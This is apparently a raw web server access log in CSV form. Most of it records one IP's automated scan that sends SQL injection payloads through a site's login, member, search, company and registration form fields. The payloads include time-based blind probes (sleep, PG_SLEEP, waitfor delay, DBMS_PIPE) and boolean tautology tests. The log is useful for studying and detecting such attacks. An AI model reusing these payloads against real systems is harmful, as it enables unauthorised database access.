timestamp,ip,user_agent,path,method,input
2025-03-20 20:51:08,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street0\""XOR(if(now()=sysdate(),sleep(15),0))XOR\""Z"", ""effect"": [""1""], ""post_code"": ""94102""}"
2025-03-20 20:51:36,1.73.33.22,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1",apple-touch-icon.png,GET,
2025-03-20 20:51:46,1.73.33.22,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1",/,GET,
2025-03-20 20:51:58,85.208.96.193,Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html),company/detail/87/product/detail/654,GET,
2025-03-20 20:52:04,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\""+(select(0)from(select(sleep(15)))v)+\""*/"", ""effect"": [""1""], ""post_code"": ""94102""}"
2025-03-20 20:54:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""TestingKA0AnwKe') OR 435=(SELECT 435 FROM PG_SLEEP(15))--"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 20:55:13,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing5UvPeOFC')) OR 624=(SELECT 624 FROM PG_SLEEP(15))--"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 20:55:50,66.102.9.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4590.2 Safari/537.36 Chrome-Lighthouse",article/detail/175,GET,
2025-03-20 20:56:37,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 20:57:12,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""-1' OR 5*5=25 or 'QPu7EcTx'='"", ""login_type"": ""project""}"
2025-03-20 20:57:54,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 20:58:13,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""7""]}"
2025-03-20 20:58:18,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""(select 198766*667891 from DUAL)"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 20:58:21,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",search,GET,"{""category"": ""1"", ""content_type"": ""0"", ""order"": ""1"", ""search"": ""e"", ""tag"": [""-1\"" OR 5*5=26 --""]}"
2025-03-20 20:59:16,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""inquiry"": [""1""], ""post_code"": ""94102-1 waitfor delay '0:0:15' --""}"
2025-03-20 20:59:24,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",search,GET,"{""category"": ""1"", ""content_type"": ""0"", ""order"": ""1"", ""search"": ""e"", ""tag"": [""-1\"" OR 5*5=26 or \""YBFZ6LWS\""=\""""]}"
2025-03-20 21:00:17,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:00:20,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""@@OA7T6"", ""effect"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:00:38,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:01:34,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""-1 OR 5*5=25"", ""scene"": ""1"", ""tag"": [""7""]}"
2025-03-20 21:01:38,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:02:32,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",search,GET,"{""category"": ""1"", ""content_type"": ""0"", ""order"": ""1"", ""search"": ""e"", ""tag"": [""6440\""XOR(644*if(now()=sysdate(),sleep(15),0))XOR\""Z""]}"
2025-03-20 21:02:35,35.91.5.159,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",apple-touch-icon.png,GET,
2025-03-20 21:03:27,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""-1_OR_5*5"": ""25"", ""remember"": ""on""}"
2025-03-20 21:03:25,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street\ufffd\ufffd\ufffd\ufffd%2527%2522\\'\\\"""", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:03:30,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""-1\""_OR_5*5"": ""25 or \""DFlgU5RT\""=\"""", ""remember"": ""on""}"
2025-03-20 21:04:34,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""-1' OR 5*5=25 --""], ""post_code"": ""94102""}"
2025-03-20 21:04:38,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""inquiry"": [""1""], ""post_code"": ""94102ajq1HEyy' OR 691=(SELECT 691 FROM PG_SLEEP(15))--""}"
2025-03-20 21:05:29,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""100'XOR(10*if(now()=sysdate(),sleep(15),0))XOR'Z"", ""scene"": ""1"", ""tag"": [""7""]}"
2025-03-20 21:05:55,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:06:31,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""TestingjioV9QS2') OR 418=(SELECT 418 FROM PG_SLEEP(15))--"", ""login_type"": ""project""}"
2025-03-20 21:07:38,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:07:38,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""inquiry"": [""1""], ""post_code"": ""94102*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)""}"
2025-03-20 21:07:40,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:07:45,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"", ""login_type"": ""project""}"
2025-03-20 21:08:53,66.249.79.107,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.141 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",article/detail/82,GET,
2025-03-20 21:09:37,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""-1' OR 5*5=25 or 'Lk2EHaQv'='"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:09:39,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""-1' OR 5*5=26 or 'Lk2EHaQv'='"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:10:22,51.222.253.16,Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/),company/detail/39/product/detail/915,GET,
2025-03-20 21:10:43,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""inquiry"": [""1""], ""post_code"": ""@@uaVGA""}"
2025-03-20 21:10:45,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""inquiry"": [""1""], ""post_code"": ""(select 198766*667891)""}"
2025-03-20 21:11:49,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing0PoetwQa"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:12:40,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:12:40,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""-1 OR 5*5=25 --"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:12:42,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""-1' OR 5*5=25 --"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:14:53,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:14:55,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:15:38,40.77.167.74,"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",company/detail/71,GET,
2025-03-20 21:20:05,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)""], ""post_code"": ""94102""}"
2025-03-20 21:21:07,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:21:55,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:22:04,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""(select DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15) from dual)"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:22:07,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIXUOJoUEjt"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:22:15,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""7""]}"
2025-03-20 21:23:06,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""projectE3y1qeCZ')) OR 359=(SELECT 359 FROM PG_SLEEP(15))--""}"
2025-03-20 21:24:04,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:24:06,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""@@JGSac"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:24:38,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:25:01,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1hMVJiSIi"", ""tag"": [""7""]}"
2025-03-20 21:25:04,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1\"" OR 3*2>999 --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:25:15,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project""}"
2025-03-20 21:26:07,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:26:10,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:27:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:28:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project""}"
2025-03-20 21:28:18,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""-1 OR 5*5=25""}"
2025-03-20 21:28:38,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:30:10,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""-1' OR 5*5=25 or '11BDyn2g'='""}"
